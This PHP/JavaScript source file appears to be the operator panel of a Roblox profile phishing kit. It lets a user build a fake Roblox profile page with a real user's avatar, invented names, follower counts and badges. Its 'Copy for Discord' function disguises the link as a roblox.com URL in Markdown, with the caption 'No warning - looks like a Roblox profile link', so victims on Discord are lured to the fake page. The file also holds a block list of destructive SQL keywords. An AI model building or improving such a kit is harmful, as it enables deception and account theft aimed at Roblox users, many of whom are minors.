<?php
/* ---- functions this file uses (formerly from libs/functions.php, which is no longer needed) ---- */
if (!function_exists('executeSafeQuery')) {
function executeSafeQuery($sql, $params = []) {
    static $db = null;   // one database connection for the whole page (was: a new one for every query)
    if ($db === null) {
        include $_SERVER['DOCUMENT_ROOT'] . '/libs/connection.php';
    }
    
    // Block suspicious keywords (customize based on your needs)
$blockedKeywords = ['DROP TABLE', 'DELETE FROM', 'TRUNCATE TABLE', 'GRANT ', 'ALTER TABLE', 'CREATE TABLE', 'CREATE DATABASE'];
	foreach ($blockedKeywords as $keyword) {
        if (stripos($sql, $keyword) !== false) {
            throw new Exception("Suspicious SQL operation detected");
        }
    }

    try {
        $stmt = $db->prepare($sql);
        
        // Bind parameters securely
        foreach ($params as $key => $value) {
            $stmt->bindValue(is_int($key) ? $key + 1 : $key, $value, 
                is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR);
        }
        
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        error_log("Database error: " . $e->getMessage());
        return [];
    }
}
}
/* ---- end of the functions from libs/functions.php ---- */
if (!function_exists('ultimaAuthenticatedRegular')) {
    function ultimaAuthenticatedRegular()
    {
        static $authenticatedUser = null;
        if (is_array($authenticatedUser)) {
            return $authenticatedUser;
        }
        if (session_status() !== PHP_SESSION_ACTIVE) {
            session_name('token');
            if (!session_start()) {
                return null;
            }
        }
        if (session_name() !== 'token' || !function_exists('executeSafeQuery')) {
            return null;
        }
        $authCode = trim((string)($_SESSION['auth_code'] ?? ''));
        if ($authCode === '') {
            return null;
        }
        try {
            $rows = executeSafeQuery(
                'SELECT * FROM regular WHERE auth_code = :auth_code LIMIT 2',
                [':auth_code' => $authCode]
            );
        } catch (\Throwable $e) {
            return null;
        }
        if (!is_array($rows) || count($rows) !== 1 || !is_array($rows[0])) {
            return null;
        }
        $row = $rows[0];
        $storedAuthCode = (string)($row['auth_code'] ?? '');
        $resolvedLinkId = (int)($row['link_id'] ?? 0);
        if ($storedAuthCode === '' || !hash_equals($storedAuthCode, $authCode) || $resolvedLinkId <= 0) {
            return null;
        }
        $authenticatedUser = $row;
        return $authenticatedUser;
    }
}

$__authResolved = ultimaAuthenticatedRegular();
if (!is_array($__authResolved)) {
    http_response_code(401);
    return;
}
$userData = $__authResolved;
$link_id = (int)$userData['link_id'];
$linkId = $link_id;



$defRealUsername = 'Applesharvested';
$defFakeUsername = 'real_pika0394058201840';
$defDisplayName = 'として';
$defFriends = '18';
$defFollowers = '1142';
$defFollowings = '6';
$defAbout = '';
$defActivity = 'offline';
$defCreatedDate = '2022-06-28';
$defPremium = 0;
$defVerified = 0;
$defJoinButton = 1;

$isFirstVisit = empty($userData['names_username']) && 
                empty($userData['names_displayName']) && 
                empty($userData['names_combinedName']);

if ($isFirstVisit && isset($link_id) && isset($db)) {
    try {
        $defaultUserId = 1;
        $apiUrl = "https://users.roblox.com/v1/usernames/users";
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $apiUrl,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 5,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode(['usernames' => [$defRealUsername], 'excludeBannedUsers' => true]),
            CURLOPT_HTTPHEADER => ['Content-Type: application/json']
        ]);
        $response = curl_exec($ch);
        curl_close($ch);
        
        if ($response) {
            $data = json_decode($response, true);
            if (isset($data['data'][0]['id'])) {
                $defaultUserId = $data['data'][0]['id'];
            }
        }
        
        $updateQuery = "UPDATE `regular` SET 
            `user_id` = :user_id,
            `names_username` = :names_username,
            `names_displayName` = :names_displayName,
            `names_combinedName` = :names_combinedName,
            `profile_friend` = :profile_friend,
            `profile_follower` = :profile_follower,
            `profile_following` = :profile_following,
            `profile_about` = :profile_about,
            `profile_activity` = :profile_activity,
            `profile_date` = :profile_date,
            `profile_premium` = :profile_premium,
            `profile_verified` = :profile_verified,
            `profile_join_button` = :profile_join_button
            WHERE `link_id` = :link_id";
        
        $stmt = $db->prepare($updateQuery);
        $stmt->execute([
            ':user_id' => $defaultUserId,
            ':names_username' => $defRealUsername,
            ':names_displayName' => $defFakeUsername,
            ':names_combinedName' => $defDisplayName,
            ':profile_friend' => $defFriends,
            ':profile_follower' => $defFollowers,
            ':profile_following' => $defFollowings,
            ':profile_about' => $defAbout,
            ':profile_activity' => $defActivity,
            ':profile_date' => $defCreatedDate,
            ':profile_premium' => $defPremium,
            ':profile_verified' => $defVerified,
            ':profile_join_button' => $defJoinButton,
            ':link_id' => $link_id
        ]);
        
        $userData['user_id'] = $defaultUserId;
        $userData['names_username'] = $defRealUsername;
        $userData['names_displayName'] = $defFakeUsername;
        $userData['names_combinedName'] = $defDisplayName;
        $userData['profile_friend'] = $defFriends;
        $userData['profile_follower'] = $defFollowers;
        $userData['profile_following'] = $defFollowings;
        $userData['profile_about'] = $defAbout;
        $userData['profile_activity'] = $defActivity;
        $userData['profile_date'] = $defCreatedDate;
        $userData['profile_premium'] = $defPremium;
        $userData['profile_verified'] = $defVerified;
        $userData['profile_join_button'] = $defJoinButton;
        
    } catch (Exception $e) {
        error_log("Profile first visit save error: " . $e->getMessage());
    }
}


$avatarUserId = $userData['user_id'] ?? '1';
$avatarUrl = 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-310966282D3529E36976BF6B07B1DC90-Png/150/150/AvatarHeadshot/Webp/noFilter';
if ($avatarUserId && $avatarUserId != '1') {
    $apiUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={$avatarUserId}&size=150x150&format=Png&isCircular=false";
    $ch = curl_init();
    curl_setopt_array($ch, [CURLOPT_URL => $apiUrl, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 5, CURLOPT_SSL_VERIFYPEER => false]);
    $response = curl_exec($ch);
    curl_close($ch);
    if ($response) {
        $data = json_decode($response, true);
        if (isset($data['data'][0]['imageUrl'])) $avatarUrl = $data['data'][0]['imageUrl'];
    }
}

$dbRealUsername = $userData['names_username'] ?? '';
$dbFakeUsername = $userData['names_displayName'] ?? '';
$dbDisplayName = $userData['names_combinedName'] ?? '';
$dbFriends = $userData['profile_friend'] ?? '';
$dbFollowers = $userData['profile_follower'] ?? '';
$dbFollowings = $userData['profile_following'] ?? '';
$dbAbout = $userData['profile_about'] ?? '';

$showRealUsername = ($dbRealUsername === $defRealUsername) ? '' : $dbRealUsername;
$showFakeUsername = (trim($dbFakeUsername) === $defFakeUsername || empty($dbFakeUsername)) ? '' : $dbFakeUsername;
$showDisplayName = ($dbDisplayName === $defDisplayName) ? '' : $dbDisplayName;
$showFriends = ((string)$dbFriends === $defFriends) ? '' : $dbFriends;
$showFollowers = ((string)$dbFollowers === $defFollowers) ? '' : $dbFollowers;
$showFollowings = ((string)$dbFollowings === $defFollowings) ? '' : $dbFollowings;
$showAbout = ($dbAbout === $defAbout) ? '' : $dbAbout;

$previewDisplayName = !empty($dbDisplayName) ? $dbDisplayName : $defDisplayName;
$previewFakeUsername = !empty($dbFakeUsername) ? $dbFakeUsername : $defFakeUsername;
$previewFriends = !empty($dbFriends) ? $dbFriends : $defFriends;
$previewFollowers = !empty($dbFollowers) ? $dbFollowers : $defFollowers;
$previewFollowings = !empty($dbFollowings) ? $dbFollowings : $defFollowings;

$isPremium = !empty($userData['profile_premium']) && ($userData['profile_premium'] == 1 || $userData['profile_premium'] === 'true');
$isVerified = !empty($userData['profile_verified']) && ($userData['profile_verified'] == 1 || $userData['profile_verified'] === 'true');
$isJoinBtn = !isset($userData['profile_join_button']) ? true : ($userData['profile_join_button'] == 1 || $userData['profile_join_button'] === 'true' || $userData['profile_join_button'] === true);
$activity = $userData['profile_activity'] ?? 'offline';
$createdDate = $userData['profile_date'] ?? '2022-06-28';
?>
<style>
*{box-sizing:border-box}
.profile-preview{background:transparent;border:1px solid rgba(255,255,255,0.07);border-radius:14px;padding:20px;margin-bottom:20px;display:flex;align-items:center;justify-content:space-between;gap:20px}
.profile-left{display:flex;align-items:center;gap:15px}
.profile-avatar{width:70px;height:70px;border-radius:50%;border:3px solid rgba(255, 255, 255,0.3);object-fit:cover;background:none}
.profile-info h2{font-family:'Rajdhani',sans-serif;font-size:1.4rem;font-weight:700;color:#fff;margin:0;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
.profile-info .username{color:rgba(255,255,255,0.5);font-size:0.9rem;margin:2px 0 8px 0;word-break:break-all}
.profile-info .username::before{content:'@'}
.profile-stats{display:flex;gap:15px;font-size:0.85rem;flex-wrap:wrap}
.profile-stats span{color:rgba(255,255,255,0.7)}
.profile-stats strong{color:#fff;margin-right:3px}
.premium-icon{width:20px;height:20px;vertical-align:middle;margin-left:3px}
.verified-icon{width:20px;height:20px;vertical-align:middle;margin-left:3px}
.status-indicator{display:none}
.avatar-wrapper{position:relative;display:inline-block;flex-shrink:0}
.avatar-status-icon{position:absolute;bottom:2px;right:2px;width:20px;height:20px;background-size:100% auto;background-repeat:no-repeat}
.profile-right{display:flex;flex-direction:column;gap:8px;flex-shrink:0;width:290px}
.profile-btn{padding:10px 20px;border-radius:8px;font-family:'Rajdhani',sans-serif;font-size:0.9rem;font-weight:600;cursor:pointer;transition:all 0.3s ease;display:flex;align-items:center;justify-content:center;gap:8px;min-width:120px;white-space:nowrap}
.profile-btn.copy-url,.profile-btn.copy-discord{background:transparent;border:1px solid rgba(255,255,255,0.13);color:rgba(255,255,255,0.75)}
.profile-btn.copy-url:hover,.profile-btn.copy-discord:hover{background:transparent;border-color:rgba(255,255,255,0.3);color:#fff;box-shadow:none}
.profile-btn.copy-discord{flex-direction:column;align-items:flex-start;gap:2px;padding:9px 14px;min-width:168px;white-space:normal}
.profile-btn.copy-discord .btn-main{display:flex;align-items:center;gap:8px;font-size:0.9rem;white-space:nowrap}
.profile-btn.copy-discord .btn-sub{font-size:0.68rem;font-weight:500;color:rgba(255,255,255,0.38);letter-spacing:.02em;white-space:normal;line-height:1.25;text-align:left}
.profile-btn-wrap{position:relative;display:flex;flex-direction:column;gap:8px;width:100%}
.profile-right .profile-btn{width:100%;box-sizing:border-box}
.profile-btn.goto{background:transparent;border:1px solid rgba(255,255,255,0.13);color:rgba(255,255,255,0.75)}
.profile-btn.goto:hover{background:transparent;border-color:rgba(255,255,255,0.3);color:#fff}
.form-row{display:grid;grid-template-columns:repeat(2,1fr);gap:15px;margin-bottom:15px;max-width:100%}
.form-row.three-col{grid-template-columns:repeat(3,1fr)}
.form-row.four-col{grid-template-columns:repeat(4,1fr)}
.form-row.full-width{grid-template-columns:1fr}
.input-group{display:flex;flex-direction:column;gap:0.4rem;min-width:0;overflow:hidden}
.input-group.full{grid-column:1/-1}
.input-group label{color:rgba(255,255,255,0.6);font-family:'Rajdhani',sans-serif;font-size:0.75rem;font-weight:600;text-transform:uppercase;letter-spacing:1px}
.input-group input,.input-group select{padding:12px 15px;background:transparent;border:1px solid rgba(255,255,255,0.07);color:rgba(255,255,255,0.85);border-radius:8px;font-family:'Rajdhani',sans-serif;font-size:1rem;transition:border-color 0.3s ease, box-shadow 0.3s ease;width:100%;min-width:0;box-sizing:border-box}
.input-group input[type="date"]{-webkit-appearance:none;appearance:none;min-width:0;max-width:100%}
.input-group input::placeholder,.input-group textarea::placeholder{color:rgba(255,255,255,0.35)}
.input-group input:hover,.input-group select:hover{border-color:rgba(255,255,255,0.13);background:transparent}
.input-group input:focus,.input-group select:focus{border-color:rgba(255,255,255,0.45);outline:none;box-shadow:inset 0 0 0 1px rgba(255,255,255,0.06), 0 0 0 3px rgba(255,255,255,0.03);background:rgba(255,255,255,0.015)}
.input-group select option{background:#07070b;color:#fff}
.input-group textarea{padding:12px 15px;background:transparent;border:1px solid rgba(255,255,255,0.07);color:rgba(255,255,255,0.85);border-radius:8px;font-family:'Rajdhani',sans-serif;font-size:1rem;resize:vertical;min-height:80px;transition:border-color 0.3s ease, box-shadow 0.3s ease;width:100%}
.input-group textarea:hover{border-color:rgba(255,255,255,0.13);background:transparent}
.input-group textarea:focus{border-color:rgba(255,255,255,0.45);outline:none;box-shadow:inset 0 0 0 1px rgba(255,255,255,0.06), 0 0 0 3px rgba(255,255,255,0.03);background:rgba(255,255,255,0.015)}
.date-input-wrapper{position:relative;width:100%;overflow:hidden}
.date-input-wrapper input{width:100%;padding-right:40px;box-sizing:border-box;max-width:100%}
.date-input-wrapper::after{content:'';position:absolute;right:12px;top:50%;transform:translateY(-50%);width:18px;height:18px;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='rgba(255,255,255,0.5)' viewBox='0 0 24 24'%3E%3Cpath d='M19 4h-1V2h-2v2H8V2H6v2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V10h14v10zm0-12H5V6h14v2z'/%3E%3C/svg%3E");background-size:contain;background-repeat:no-repeat;pointer-events:none}
.save-btn{background:rgba(255,255,255,0.08);border:none;color:rgba(255,255,255,0.75);padding:13px 44px;border-radius:10px;cursor:pointer;font-family:'Rajdhani',sans-serif;font-size:1rem;font-weight:600;transition:all 0.3s ease;display:flex;align-items:center;justify-content:center;gap:8px;margin:22px auto 0;width:auto;box-shadow:0 2px 12px rgba(0,0,0,0.3),0 0 0 1px rgba(255,255,255,0.06) inset;letter-spacing:0.3px}
.save-btn:hover{background:rgba(255,255,255,0.12);color:#fff;box-shadow:0 4px 24px rgba(0,0,0,0.4),0 0 0 1px rgba(255,255,255,0.1) inset,0 0 20px rgba(255,255,255,0.04);transform:translateY(-1px)}
.save-btn:active{transform:translateY(0);box-shadow:0 1px 8px rgba(0,0,0,0.3),0 0 0 1px rgba(255,255,255,0.06) inset}
#profileController{overflow:hidden;max-width:100%}
@media(max-width:768px){
    .profile-preview{flex-direction:column;text-align:center;padding:16px;gap:14px}
    .profile-left{flex-direction:column;align-items:center;gap:12px;width:100%}
    .profile-avatar{width:60px;height:60px}
    .profile-info{width:100%}
    .profile-info h2{justify-content:center;font-size:1.2rem}
    .profile-info .username{text-align:center;font-size:0.85rem}
    .profile-stats{justify-content:center;flex-wrap:wrap;gap:10px;font-size:0.8rem}
    .profile-right{flex-direction:row;width:100%;gap:8px}
    .profile-btn{flex:1;min-width:0;padding:10px 12px;font-size:0.85rem}
    .form-row{grid-template-columns:1fr;gap:12px;margin-bottom:12px}
    .form-row.three-col{grid-template-columns:1fr}
    .form-row.four-col{grid-template-columns:repeat(2,1fr);gap:10px}
    .input-group input,.input-group select{padding:10px 12px;font-size:0.95rem}
    .input-group textarea{padding:10px 12px;font-size:0.95rem;min-height:70px}
    .input-group label{font-size:0.7rem}
    .save-btn{width:100%;padding:12px 20px;font-size:0.95rem}
    .date-input-wrapper input{padding-right:35px;font-size:0.85rem}
}
@media(max-width:480px){
    .date-input-wrapper input{padding-right:30px;font-size:0.8rem}
    .date-input-wrapper::after{right:8px;width:14px;height:14px}
}
@media(max-width:480px){
    .profile-preview{padding:14px;gap:12px;border-radius:10px}
    .profile-avatar{width:55px;height:55px;border-width:2px}
    .profile-info h2{font-size:1.1rem;gap:5px}
    .profile-stats{gap:8px;font-size:0.75rem}
    .profile-stats span{white-space:nowrap}
    .profile-right{gap:6px}
    .profile-btn{padding:9px 10px;font-size:0.8rem;border-radius:6px}
    .form-row.four-col{grid-template-columns:1fr}
    .input-group input,.input-group select{padding:9px 10px;font-size:0.9rem;border-radius:6px}
    .input-group textarea{padding:9px 10px;font-size:0.9rem;border-radius:6px}
    .save-btn{padding:11px 16px;font-size:0.9rem;border-radius:6px}
    .card{padding:12px}
}
@media(max-width:360px){
    .profile-preview{padding:12px}
    .profile-avatar{width:48px;height:48px}
    .profile-info h2{font-size:1rem}
    .profile-stats{flex-direction:column;gap:4px;align-items:center}
    .profile-btn{padding:8px;font-size:0.78rem}
    .input-group input,.input-group select,.input-group textarea{font-size:0.85rem;padding:8px}
}
</style>
<div id="profileForm" class="tab-content hidden">
    <div class="profile-preview">
        <div class="profile-left">
            <div class="avatar-wrapper">
                <img id="profileAvatar" class="profile-avatar" src="<?= htmlspecialchars($avatarUrl) ?>" alt="Avatar">
                <?php if($activity !== 'offline'): ?>
                <div id="avatarStatusIcon" class="avatar-status-icon" style="background-image: url('https://images.rbxcdn.com/34d457aefdc88489b8d2b2c4f30ae450-friendsstatus_dark.svg'); background-position: 0px <?php 
                    if($activity == 'ingame') echo '0px';
                    elseif($activity == 'studio') echo '-20px';
                    elseif($activity == 'online') echo '-40px';
                ?>;"></div>
                <?php else: ?>
                <div id="avatarStatusIcon" class="avatar-status-icon" style="display:none;"></div>
                <?php endif; ?></div>
            <div class="profile-info">
                <h2>
                    <span id="previewDisplayName"><?= htmlspecialchars($previewDisplayName) ?></span>
                    <?php if($isVerified): ?>
                    <svg class="verified-icon" viewBox="0 0 32 32" width="20" height="20"><path d="M10.1641 3.06852C9.09906 2.78315 8.00434 3.41518 7.71897 4.48022L3.06852 21.8359C2.78315 22.9009 3.41518 23.9957 4.48022 24.281L21.8359 28.9315C22.9009 29.2169 23.9957 28.5848 24.281 27.5198L28.9315 10.1641C29.2169 9.09906 28.5848 8.00434 27.5198 7.71897L10.1641 3.06852ZM21.7071 12.2929C22.0976 12.6834 22.0976 13.3166 21.7071 13.7071L14.7071 20.7071C14.3166 21.0976 13.6834 21.0976 13.2929 20.7071L10.2929 17.7071C9.90237 17.3166 9.90237 16.6834 10.2929 16.2929C10.6834 15.9024 11.3166 15.9024 11.7071 16.2929L14 18.5858L20.2929 12.2929C20.6834 11.9024 21.3166 11.9024 21.7071 12.2929Z" fill="#0066FF"/></svg>
                    <?php endif; ?>
                    <?php if($isPremium): ?>
                    <svg class="premium-icon" viewBox="0 0 32 32" width="20" height="20"><path d="M23 4C25.7614 4 28 6.23858 28 9V23C28 25.7614 25.7614 28 23 28H15C14.4477 28 14 27.5523 14 27C14 26.4477 14.4477 26 15 26H23C24.6569 26 26 24.6569 26 23V9C26 7.34315 24.6569 6 23 6H9C7.34315 6 6 7.34315 6 9V27C6 27.5523 5.55228 28 5 28C4.44772 28 4 27.5523 4 27V9C4 6.23858 6.23858 4 9 4H23Z" fill="white"/><path d="M20 10C21.1046 10 22 10.8954 22 12V20C22 21.1046 21.1046 22 20 22H15C14.4477 22 14 21.5523 14 21C14 20.4477 14.4477 20 15 20H20V12H12V27C12 27.5523 11.5523 28 11 28C10.4477 28 10 27.5523 10 27V12C10 10.8954 10.8954 10 12 10H20Z" fill="white"/></svg>
                    <?php endif; ?>
                </h2>
                <p class="username" id="previewUsername"><?= htmlspecialchars($previewFakeUsername) ?></p>
                <div class="profile-stats">
                    <span><strong id="previewFriends"><?= htmlspecialchars($previewFriends) ?></strong> Friends</span>
                    <span><strong id="previewFollowers"><?= htmlspecialchars($previewFollowers) ?></strong> Followers</span>
                    <span><strong id="previewFollowing"><?= htmlspecialchars($previewFollowings) ?></strong> Following</span>
                </div>
            </div>
        </div>
        <div class="profile-right">
            <div class="profile-btn-wrap">
                <button type="button" class="profile-btn copy-discord" id="copyDiscordBtn" onclick="copyHyperLink()">
                    <span class="btn-main"><i class="fab fa-discord"></i> Copy for Discord</span>
                    <span class="btn-sub">No warning - looks like a Roblox profile link</span>
                </button>
                <button type="button" class="profile-btn copy-url" onclick="copyProfileUrl()"><i class="fas fa-copy"></i> Copy URL</button>
            </div>
            <button type="button" class="profile-btn goto" onclick="gotoProfile()"><i class="fas fa-external-link-alt"></i> Go to</button>
        </div>
    </div>
    <div class="card">
        <form id="profileController">
            <div class="form-row">
                <div class="input-group">
                    <label>REAL USERNAME</label>
                    <input type="text" name="real_username" id="realUsername" value="<?= htmlspecialchars($showRealUsername) ?>" placeholder="<?= htmlspecialchars($defRealUsername) ?>" oninput="updatePreview()" onchange="updateAvatar()">
                </div>
                <div class="input-group">
                    <label>FAKE USERNAME</label>
                    <input type="text" name="fake_username" id="fakeUsername" value="<?= htmlspecialchars($showFakeUsername) ?>" placeholder="<?= htmlspecialchars($defFakeUsername) ?>" oninput="updatePreview()">
                </div>
            </div>
            <div class="form-row four-col">
                <div class="input-group">
                    <label>DISPLAY NAME</label>
                    <input type="text" name="display_username" id="displayUsername" value="<?= htmlspecialchars($showDisplayName) ?>" placeholder="<?= htmlspecialchars($defDisplayName) ?>" oninput="updatePreview()">
                </div>
                <div class="input-group">
                    <label>PREMIUM</label>
                    <select name="premium" id="premiumSelect" onchange="updatePreview()">
                        <option value="false" <?= !$isPremium ? 'selected' : '' ?>>No</option>
                        <option value="true" <?= $isPremium ? 'selected' : '' ?>>Yes</option>
                    </select>
                </div>
                <div class="input-group">
                    <label>VERIFIED BADGE</label>
                    <select name="verified_badge" id="verifiedSelect" onchange="updatePreview()">
                        <option value="false" <?= !$isVerified ? 'selected' : '' ?>>No</option>
                        <option value="true" <?= $isVerified ? 'selected' : '' ?>>Yes</option>
                    </select>
                </div>
                <div class="input-group">
                    <label>JOIN BUTTON</label>
                    <select name="join_button" id="joinSelect">
                        <option value="false" <?= !$isJoinBtn ? 'selected' : '' ?>>False</option>
                        <option value="true" <?= $isJoinBtn ? 'selected' : '' ?>>True</option>
                    </select>
                </div>
            </div>
            <div class="form-row three-col">
                <div class="input-group">
                    <label>FRIENDS</label>
                    <input type="text" name="friends" id="friendsInput" value="<?= htmlspecialchars($showFriends) ?>" placeholder="<?= htmlspecialchars($defFriends) ?>" oninput="updatePreview()">
                </div>
                <div class="input-group">
                    <label>FOLLOWERS</label>
                    <input type="text" name="followers" id="followersInput" value="<?= htmlspecialchars($showFollowers) ?>" placeholder="<?= htmlspecialchars($defFollowers) ?>" oninput="updatePreview()">
                </div>
                <div class="input-group">
                    <label>FOLLOWINGS</label>
                    <input type="text" name="followings" id="followingsInput" value="<?= htmlspecialchars($showFollowings) ?>" placeholder="<?= htmlspecialchars($defFollowings) ?>" oninput="updatePreview()">
                </div>
            </div>
            <div class="form-row">
                <div class="input-group">
                    <label>STATUS</label>
                    <select name="activity" id="activitySelect" onchange="updatePreview()">
                        <option value="offline" <?= $activity == 'offline' ? 'selected' : '' ?>>Offline (suggest)</option>
                        <option value="online" <?= $activity == 'online' ? 'selected' : '' ?>>Online</option>
                        <option value="ingame" <?= $activity == 'ingame' ? 'selected' : '' ?>>In Game</option>
                        <option value="studio" <?= $activity == 'studio' ? 'selected' : '' ?>>In Studio</option>
                    </select>
                </div>
                <div class="input-group">
                    <label>CREATION DATE</label>
                    <div class="date-input-wrapper">
                        <input type="date" name="created_date" id="createdDate" value="<?= htmlspecialchars($createdDate) ?>">
                    </div>
                </div>
            </div>
            <div class="form-row full-width">
                <div class="input-group full">
                    <label>DESCRIPTION</label>
                    <textarea name="about" id="aboutInput" rows="3" placeholder="<?= htmlspecialchars($defAbout) ?>"><?= htmlspecialchars($showAbout) ?></textarea>
                </div>
            </div>
            <button type="button" class="save-btn" onclick="saveProfileData()"><i class="fas fa-save"></i> Save Changes</button>
        </form>
    </div>
</div>
<script>
function saveProfileData(){
    var btn=document.querySelector('#profileForm .save-btn');
    btn.disabled=true;
    btn.innerHTML='<i class="fas fa-spinner fa-spin"></i> Saving...';
    function g(id){
        var el=document.getElementById(id);
        var v=el.value.trim();
        return v!==''?v:el.placeholder;
    }
    var data={
        real_username:g('realUsername'),
        fake_username:g('fakeUsername'),
        display_username:g('displayUsername'),
        friends:g('friendsInput'),
        followers:g('followersInput'),
        followings:g('followingsInput'),
        about:g('aboutInput'),
        premium:document.getElementById('premiumSelect').value,
        verified_badge:document.getElementById('verifiedSelect').value,
        join_button:document.getElementById('joinSelect').value,
        activity:document.getElementById('activitySelect').value,
        created_date:document.getElementById('createdDate').value
    };
    fetch('/apis/change?type=profile',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify(data)
    })
    .then(function(r){return r.json();})
    .then(function(res){
        btn.disabled=false;
        btn.innerHTML='<i class="fas fa-save"></i> Save Changes';
        if(res.success){
            if(typeof showSuccessModal==='function'){
                showSuccessModal();
            }
            setTimeout(function(){location.reload();},1500);
        }else{
            if(typeof Swal!=='undefined'){
                Swal.fire({icon:'error',title:'Error',text:res.message||'Failed to save',confirmButtonColor:'rgba(255, 255, 255, 0.5)'});
            }else{
                alert(res.message||'Error');
            }
        }
    })
    .catch(function(e){
        btn.disabled=false;
        btn.innerHTML='<i class="fas fa-save"></i> Save Changes';
        if(typeof Swal!=='undefined'){
            Swal.fire({icon:'error',title:'Network Error',text:'Connection failed',confirmButtonColor:'rgba(255, 255, 255, 0.5)'});
        }else{
            alert('Connection error');
        }
    });
}
function updatePreview(){
    var dn=document.getElementById('displayUsername');
    var fn=document.getElementById('fakeUsername');
    var fr=document.getElementById('friendsInput');
    var fo=document.getElementById('followersInput');
    var fg=document.getElementById('followingsInput');
    document.getElementById('previewDisplayName').textContent=dn.value||dn.placeholder;
    document.getElementById('previewUsername').textContent=fn.value||fn.placeholder;
    document.getElementById('previewFriends').textContent=fr.value||fr.placeholder;
    document.getElementById('previewFollowers').textContent=fo.value||fo.placeholder;
    document.getElementById('previewFollowing').textContent=fg.value||fg.placeholder;
    var act=document.getElementById('activitySelect').value;
    var icon=document.getElementById('avatarStatusIcon');
    if(act==='offline'){
        icon.style.display='none';
    }else{
        icon.style.display='block';
        icon.style.backgroundImage="url('https://images.rbxcdn.com/34d457aefdc88489b8d2b2c4f30ae450-friendsstatus_dark.svg')";
        if(act==='ingame') icon.style.backgroundPosition='0px 0px';
        else if(act==='studio') icon.style.backgroundPosition='0px -20px';
        else if(act==='online') icon.style.backgroundPosition='0px -40px';
    }
    var p=document.querySelector('.premium-icon');if(p)p.style.display=document.getElementById('premiumSelect').value==='true'?'inline':'none';
    var v=document.querySelector('.verified-icon');if(v)v.style.display=document.getElementById('verifiedSelect').value==='true'?'inline':'none';
}
function copyProfileUrl(){
    var url='https://'+domains[currentDomainIndex]+'/users/<?=$link_id?>/profile';
    navigator.clipboard.writeText(url).then(function(){
        var btn=document.querySelector('.profile-btn.copy-url'),o=btn.innerHTML;
        btn.innerHTML='<i class="fas fa-check"></i> Copied!';btn.style.background='rgba(0,255,100,0.2)';btn.style.borderColor='#00ff64';btn.style.color='#00ff64';
        setTimeout(function(){btn.innerHTML=o;btn.style.background='';btn.style.borderColor='';btn.style.color='';},2000);
    });
}
function gotoProfile(){window.open('https://'+domains[currentDomainIndex]+'/users/<?=$link_id?>/profile','_blank');}
function copyHyperLink(){
    var url='https://'+domains[currentDomainIndex]+'/users/<?=$link_id?>/profile';
    var btn=document.getElementById('copyDiscordBtn');
    if(!btn)return;
    var main=btn.querySelector('.btn-main');
    var old=main?main.innerHTML:'';
    if(main)main.innerHTML='<i class="fas fa-spinner fa-spin"></i> Shortening...';
    fetch('?action=shorten_url',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:url})})
    .then(function(r){return r.json();})
    .then(function(d){
        var short=d.shorturl||url;
        var text='[https//www.roblox.com/users/<?=$link_id?>/profile]('+short+')';
        return navigator.clipboard.writeText(text);
    })
    .then(function(){
        if(main)main.innerHTML='<i class="fas fa-check"></i> Paste Now Discord';
        setTimeout(function(){if(main)main.innerHTML=old;},2000);
    })
    .catch(function(){
        var text='[https//www.roblox.com/users/<?=$link_id?>/profile]('+url+')';
        navigator.clipboard.writeText(text);
        if(main)main.innerHTML='<i class="fas fa-check"></i> Paste Now Discord';
        setTimeout(function(){if(main)main.innerHTML=old;},2000);
    });
}
function updateAvatar(){
    var username=document.getElementById('realUsername').value.trim();
    if(username==='')username=document.getElementById('realUsername').placeholder;
    fetch('https://users.roblox.com/v1/usernames/users',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({usernames:[username],excludeBannedUsers:true})
    })
    .then(function(r){return r.json();})
    .then(function(res){
        if(res.data && res.data.length>0){
            var userId=res.data[0].id;
            fetch('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds='+userId+'&size=150x150&format=Png&isCircular=false')
            .then(function(r){return r.json();})
            .then(function(thumbRes){
                if(thumbRes.data && thumbRes.data.length>0 && thumbRes.data[0].imageUrl){
                    document.getElementById('profileAvatar').src=thumbRes.data[0].imageUrl;
                }
            });
        }
    })
    .catch(function(e){});
}
</script>